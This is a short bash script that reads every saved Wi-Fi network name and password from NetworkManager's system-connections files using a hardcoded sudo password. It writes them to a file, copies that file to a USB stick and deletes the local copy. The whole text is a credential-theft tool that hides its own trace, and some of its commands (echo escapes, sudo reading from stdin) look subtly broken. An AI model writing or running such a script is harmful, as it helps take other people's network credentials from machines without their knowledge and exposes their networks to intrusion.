#!/bin/bash
echo "Wireless_Network_Name Password\n--------------------- --------" > ~/Desktop/wifi_pass.txt

for FILE in /etc/NetworkManager/system-connections/*
do
    echo "$(sudo <<< "pass" cat "$FILE" | grep -oP '(?<=ssid=).*') \t\t\t\t  $(sudo <<< "pass" cat "$FILE" | grep -oP '(?<=psk=).*')"
done >> ~/Desktop/wifi_pass.txt

cp ~/Desktop/wifi_pass.txt /media/$(hostname)/UsbStick/
rm ~/Desktop/wifi_pass.txt
